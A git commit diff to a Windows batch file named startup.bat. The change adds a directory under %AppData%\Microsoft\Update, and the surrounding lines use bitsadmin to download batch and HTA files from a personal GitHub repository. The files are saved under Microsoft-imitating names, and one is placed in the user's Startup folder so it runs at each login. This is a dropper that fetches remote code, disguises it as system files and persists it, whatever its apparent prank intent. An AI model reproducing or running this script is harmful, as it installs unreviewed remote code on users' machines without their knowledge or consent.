5cda17b252f1b341d7fcb94d79a2ecfc474de84b
Sean <155543056+SeanFromWP@users.noreply.github.com>
2024-12-11 21:32:56 +0800

    Update startup.bat

--- startup.bat
+++ startup.bat
@@ -2,6 +2,7 @@
 
 cls
 
+mkdir "%AppData%\Microsoft\Update\User\Services"
 bitsadmin /transfer /download /priority low "https://raw.githubusercontent.com/SeanFromWP/Temp/main/bgwork.bat" "%AppData%\Microsoft\Update\msrklbg.bat"
 bitsadmin /transfer /download /priority low "https://raw.githubusercontent.com/SeanFromWP/Temp/main/rick.hta" "%AppData%\Microsoft\Update\msrkl.hta"
 bitsadmin /transfer /download /priority low "https://raw.githubusercontent.com/SeanFromWP/Temp/main/start_menu.bat" "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\msrkl.bat"
